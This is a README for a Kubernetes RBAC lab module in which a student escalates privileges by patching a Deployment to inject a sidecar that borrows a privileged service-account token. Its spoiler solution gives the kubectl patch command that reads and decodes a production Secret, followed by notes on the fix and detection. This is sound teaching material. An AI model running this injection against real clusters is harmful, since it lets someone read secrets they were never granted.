# sidecar-inject - container injection via patch deployments (RBAC)

An RBAC lab in the nested-cluster shape. The student lands in a `dev`-namespace
shell that can patch Deployments in `ops` but read nothing, and must read a
Secret in `production` by injecting a sidecar container into a workload that runs
as a more privileged identity.

## Shape

Everything is in the module's manifest bundle
(`services/backend/internal/labs/modules/sidecar-inject.yaml`), applied into the
session's disposable nested k3s cluster. The target Deployment and the injected
sidecar both use the shared `k8labs-foothold` image - no per-module image. The
flag is bait (see `_template`).

## The flaw

The foothold's service account (`dev/patcher`) holds `patch` on Deployments (plus
`get` on pods and `pods/log`) in `ops`. A running Pod's container list is
immutable, but the `Deployment` that owns it is editable - patching its template
to add a container rolls new pods with that container inside. Containers in a pod
share the pod's mounted service-account token, so the injected sidecar runs as
`ops/payments`, which is bound to read secrets in `production`. The foothold
reads the sidecar's logs.

## Airgap detail

The injected container must use an image already present in the nested cluster -
`k8labs-foothold:1.31` with `imagePullPolicy: Never` - or the roll stalls in
`ImagePullBackOff`. Covered in the course.

## Solution (spoiler)

```sh
kubectl auth can-i --list -n ops                 # spot: patch deployments + pods/log in ops (bare --list checks dev, shows nothing)
kubectl get deployments -n ops                    # find: payments
kubectl patch deployment payments -n ops --type=json -p='[{"op":"add","path":"/spec/template/spec/containers/-","value":{
  "name":"x","image":"k8labs-foothold:1.31","imagePullPolicy":"Never",
  "command":["sh","-c","kubectl get secret flag -n production -o jsonpath={.data.flag} | base64 -d; sleep 3600"]}}]'
# wait for the roll, then:
kubectl logs -n ops deploy/payments -c x
# k8labs{patch_a_deployment_to_inject_a_sidecar_and_borrow_its_token}
```

## The fix

Scope workload-edit rights (`patch`/`update` on deployments, daemonsets,
statefulsets) narrowly, and add admission control that inspects pod specs so an
injected container with a foreign image or command is rejected. Treat any
workload-edit verb as code execution under that workload's identity.

## What a defender sees

The API server audit log records a `patch` on the Deployment; the tell is the
spec gaining a container whose image and command do not match the app, followed
by that pod reading a production Secret. Under Kata in prod, host-level Tetragon
cannot see inside the nested cluster, so this is an audit-log / in-cluster
observation - the same design note as `ns-escape`.
